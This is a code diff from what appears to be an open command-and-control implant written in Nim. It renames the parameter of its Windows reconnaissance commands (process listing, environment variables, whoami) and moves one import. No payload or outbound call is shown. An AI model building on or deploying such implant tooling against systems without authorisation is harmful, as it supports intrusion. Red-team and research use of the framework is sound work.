@@ -1,9 +1,9 @@
 import ../common/[types, utils]
 
 # Declare function prototypes
-proc executePs(config: AgentConfig, task: Task): TaskResult
-proc executeEnv(config: AgentConfig, task: Task): TaskResult
-proc executeWhoami(config: AgentConfig, task: Task): TaskResult
+proc executePs(ctx: AgentCtx, task: Task): TaskResult
+proc executeEnv(ctx: AgentCtx, task: Task): TaskResult
+proc executeWhoami(ctx: AgentCtx, task: Task): TaskResult
 
 # Command definitions
 let commands*: seq[Command] = @[
@@ -35,15 +35,15 @@ let commands*: seq[Command] = @[
 
 # Implement execution functions
 when defined(server):
-    proc executePs(config: AgentConfig, task: Task): TaskResult = nil
-    proc executeEnv(config: AgentConfig, task: Task): TaskResult = nil
-    proc executeWhoami(config: AgentConfig, task: Task): TaskResult = nil
+    proc executePs(ctx: AgentCtx, task: Task): TaskResult = nil
+    proc executeEnv(ctx: AgentCtx, task: Task): TaskResult = nil
+    proc executeWhoami(ctx: AgentCtx, task: Task): TaskResult = nil
 
 when defined(agent): 
 
     import winim
     import os, strutils, sequtils, strformat, tables, algorithm
-    import ../agent/core/taskresult
+    import ../agent/protocol/result
 
     # TODO: Add user context to process information
     type 
@@ -53,7 +53,7 @@ when defined(agent):
             name: string 
             children: seq[DWORD]
 
-    proc executePs(config: AgentConfig, task: Task): TaskResult = 
+    proc executePs(ctx: AgentCtx, task: Task): TaskResult = 
         
         echo fmt"   [>] Listing running processes."
         
@@ -127,7 +127,7 @@ when defined(agent):
         except CatchableError as err: 
             return createTaskResult(task, STATUS_FAILED, RESULT_STRING, string.toBytes(err.msg))
 
-    proc executeEnv(config: AgentConfig, task: Task): TaskResult = 
+    proc executeEnv(ctx: AgentCtx, task: Task): TaskResult = 
 
         echo fmt"   [>] Displaying environment variables."
 
@@ -141,7 +141,7 @@ when defined(agent):
         except CatchableError as err: 
             return createTaskResult(task, STATUS_FAILED, RESULT_STRING, string.toBytes(err.msg))
 
-    proc executeWhoami(config: AgentConfig, task: Task): TaskResult = 
+    proc executeWhoami(ctx: AgentCtx, task: Task): TaskResult = 
 
         echo fmt"   [>] Getting user information."
 
